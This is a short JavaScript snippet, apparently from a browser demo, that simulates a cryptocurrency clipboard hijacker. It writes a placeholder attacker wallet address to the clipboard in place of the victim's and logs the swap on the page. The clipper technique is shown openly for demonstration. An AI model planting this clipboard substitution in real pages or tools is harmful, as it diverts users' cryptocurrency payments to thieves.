const victimAddress = "1FAKEyBoTx3zzQ8ZfKoin3EV1XoYSmUhkL";
const attackerAddress = "1ATTACKx7oP3KzXQ3HackMePlz0nlyLOL";

function copyAddress() {
  navigator.clipboard.writeText(attackerAddress)
    .then(() => {
      log(`🚨 Clipboard hijacked!`);
      log(`🧍 Victim copied: ${victimAddress}`);
      log(`💀 Replaced with: ${attackerAddress}`);
    })
    .catch(err => {
      log(`Clipboard error: ${err}`);
    });
}

function log(message) {
  const logEl = document.getElementById("log");
  const time = new Date().toLocaleTimeString();
  logEl.innerHTML += `[${time}] ${message}<br>`;
}
